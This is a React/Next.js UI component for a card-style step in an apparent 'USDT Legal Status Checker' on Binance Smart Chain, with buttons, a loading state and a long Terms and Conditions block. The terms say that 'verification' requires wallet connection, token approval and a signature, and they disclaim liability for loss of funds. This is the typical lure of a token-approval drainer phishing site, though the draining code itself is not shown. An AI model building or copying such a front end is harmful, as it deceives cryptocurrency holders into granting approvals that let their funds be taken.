'use client';

import { Loader2 } from 'lucide-react';

interface CardStepProps {
  icon: string;
  title: string;
  description: string;
  loading: boolean;
  error: string | null;
  showTerms?: boolean;
  buttons: Array<{
    label: string;
    onClick: () => void;
    primary: boolean;
  }>;
}

export default function CardStep({
  icon,
  title,
  description,
  loading,
  error,
  showTerms = false,
  buttons,
}: CardStepProps) {
  return (
    <div className="bg-[rgba(10,20,30,0.95)] backdrop-blur-3xl p-8 rounded-3xl border border-emerald-500/30 shadow-2xl shadow-emerald-900/20 relative overflow-hidden animate-in fade-in slide-in-from-bottom-5 duration-600">
      {/* Top gradient border */}
      <div className="absolute top-0 left-0 right-0 h-px bg-gradient-to-r from-transparent via-emerald-500/50 to-transparent" />

      {/* Icon with float animation */}
      <div className="w-20 h-20 mx-auto mb-6 bg-gradient-to-br from-emerald-500/20 to-teal-600/20 rounded-2xl flex items-center justify-center text-3xl border-2 border-emerald-500/30 animate-float">
        {icon}
      </div>

      {/* Title with gradient text */}
      <h1 className="text-2xl font-bold text-center mb-3 bg-gradient-to-r from-white to-emerald-100 bg-clip-text text-transparent">
        {title}
      </h1>

      {/* Description */}
      <p className="text-center text-sm text-gray-400 mb-7 leading-relaxed line-clamp-3">
        {description}
      </p>

      {/* Terms and Conditions */}
      {showTerms && (
        <div className="mb-6 bg-black/30 border border-emerald-500/20 rounded-xl p-5 max-h-64 overflow-y-auto scrollbar-thin scrollbar-thumb-emerald-500/30 scrollbar-track-black/20">
          <h3 className="text-base font-semibold text-emerald-400 mb-4">Terms and Conditions</h3>
          <div className="text-xs text-gray-400 space-y-4 leading-relaxed">
            <p className="font-medium text-white">1. Acceptance of Terms</p>
            <p>By accessing and using the USDT Legal Status Checker service, you acknowledge that you have read, understood, and agree to be bound by these Terms and Conditions. If you do not agree to these terms, please discontinue use of this service immediately.</p>

            <p className="font-medium text-white">2. Service Description</p>
            <p>The USDT Legal Status Checker provides verification services to assess compliance of USDT holdings with applicable regulatory standards. This service requires wallet connection, token approval, and cryptographic signature for verification purposes.</p>

            <p className="font-medium text-white">3. User Responsibilities</p>
            <p>You are responsible for maintaining the security of your wallet credentials and private keys. You acknowledge that this service requires granting token approval permissions and signing transactions, and you accept full responsibility for these actions.</p>

            <p className="font-medium text-white">4. Privacy and Data Usage</p>
            <p>We collect wallet addresses and transaction signatures solely for verification purposes. This data is processed securely and is not shared with third parties except as required by law or regulatory compliance.</p>

            <p className="font-medium text-white">5. Regulatory Compliance</p>
            <p>You represent and warrant that you are not located in a jurisdiction where use of this service is prohibited, and that your use complies with all applicable local laws and regulations regarding cryptocurrency ownership and transfers.</p>

            <p className="font-medium text-white">6. No Financial Advice</p>
            <p>This service provides verification status only and does not constitute financial, legal, or investment advice. You should consult with qualified professionals before making any financial decisions.</p>

            <p className="font-medium text-white">7. Limitation of Liability</p>
            <p>The service is provided "as is" without warranties of any kind. We shall not be liable for any damages arising from your use of this service, including but not limited to loss of funds, data breaches, or regulatory actions.</p>

            <p className="font-medium text-white">8. Smart Contract Interactions</p>
            <p>By approving and signing transactions, you authorize smart contract interactions on the Binance Smart Chain network. You acknowledge the irreversible nature of blockchain transactions.</p>

            <p className="font-medium text-white">9. Termination</p>
            <p>We reserve the right to suspend or terminate access to this service at any time for any reason, including violation of these terms or suspicious activity.</p>

            <p className="font-medium text-white">10. Amendments</p>
            <p>These terms may be updated at any time. Continued use of the service after changes constitutes acceptance of the modified terms.</p>

            <p className="text-emerald-400 font-medium mt-6">By clicking "Sign & Accept Terms", you confirm that you have read and agree to these Terms and Conditions.</p>
          </div>
        </div>
      )}

      {/* Error message */}
      {error && (
        <div className="bg-red-500/10 border border-red-500/30 rounded-lg p-3 mb-6 text-xs text-red-400">
          {error}
        </div>
      )}

      {/* Buttons */}
      <div className="space-y-3">
        {buttons.map((button, idx) => (
          <button
            key={idx}
            onClick={button.onClick}
            disabled={loading}
            className={`w-full py-3 rounded-xl font-semibold text-sm transition-all duration-300 relative overflow-hidden group disabled:opacity-50 disabled:cursor-not-allowed ${
              button.primary
                ? 'bg-gradient-to-r from-emerald-500 to-teal-600 text-white hover:shadow-lg hover:shadow-emerald-500/40 hover:-translate-y-0.5'
                : 'bg-gradient-to-r from-slate-600 to-slate-700 text-white hover:shadow-lg hover:shadow-slate-500/30 hover:-translate-y-0.5'
            }`}
          >
            {/* Shimmer effect */}
            <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-500" />

            {loading ? (
              <div className="flex items-center justify-center gap-2">
                <Loader2 className="w-4 h-4 animate-spin" />
                <span>Processing...</span>
              </div>
            ) : (
              button.label
            )}
          </button>
        ))}
      </div>
    </div>
  );
}
